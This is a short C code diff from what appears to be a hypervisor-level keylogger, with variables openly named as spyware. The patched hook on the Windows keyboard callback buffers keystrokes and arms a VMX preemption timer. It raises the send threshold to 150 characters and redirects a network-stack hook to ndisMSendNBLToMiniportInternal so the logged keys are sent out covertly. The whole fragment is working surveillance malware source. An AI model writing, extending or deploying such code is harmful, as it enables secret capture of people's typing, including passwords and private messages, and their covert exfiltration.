@@ -59,9 +59,22 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
             AcquireLock(&shared_cores_data.spyware_data_lock);
             shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = kbd_US[data_phys->MakeCode];
             shared_cores_data.spyware_data_buffer.length++;
-            if (shared_cores_data.spyware_data_buffer.length >= 10){
+            
+            // Activate preemption timer
+            if (!shared_cores_data.send_pending){
+                pin_based_ctls_t pin_based_ctls = {0};
+                pin_based_ctls.value = __vmread(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS);
+
+                if (!pin_based_ctls.activate_vmx_preemption_timer){
+                    pin_based_ctls.activate_vmx_preemption_timer = TRUE;
+                    __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
+                    __vmwrite(GUEST_VMX_PREEMPTION_TIMER, SEND_TIMER_TIME);
+                }
+            }
+
+            if (shared_cores_data.spyware_data_buffer.length >= 150){
                 shared_cores_data.send_pending = TRUE;
-                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET));
+                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
             } 
             ReleaseLock(&shared_cores_data.spyware_data_lock);
         }
